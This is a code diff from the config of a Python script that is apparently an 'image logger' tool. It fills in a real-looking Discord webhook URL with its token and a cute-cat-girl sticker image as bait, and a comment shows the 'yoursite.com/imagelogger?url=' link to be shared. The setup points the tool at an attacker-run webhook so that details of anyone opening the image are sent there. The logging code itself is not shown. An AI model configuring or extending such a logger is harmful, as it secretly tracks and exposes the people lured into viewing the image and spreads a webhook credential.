@@ -13,8 +13,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1409315827886592060/nqKdSi8Uj5krz5tEkE0VMtkb01ie4AIQotCB6corW_l_W7w58WvZsZJ2wmSKDrnbKH7C",
+    "image": "https://www.google.com/imgres?q=cute%20cat%20girl&imgurl=https%3A%2F%2Fih1.redbubble.net%2Fimage.4935788494.1227%2Fst%2Csmall%2C507x507-pad%2C600x600%2Cf8f8f8.jpg&imgrefurl=https%3A%2F%2Fwww.redbubble.com%2Fi%2Fsticker%2FCute-Chibi-Anime-Cat-Girl-With-Cats-by-stickondeez%2F143721227.EJUG5&docid=_dDKWq8rFx2OvM&tbnid=GI0z_pYpOImE0M&vet=12ahUKEwi-xY7syqSPAxXpmGoFHd2xOdkQM3oECCEQAA..i&w=600&h=600&hcb=2&ved=2ahUKEwi-xY7syqSPAxXpmGoFHd2xOdkQM3oECCEQAA", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
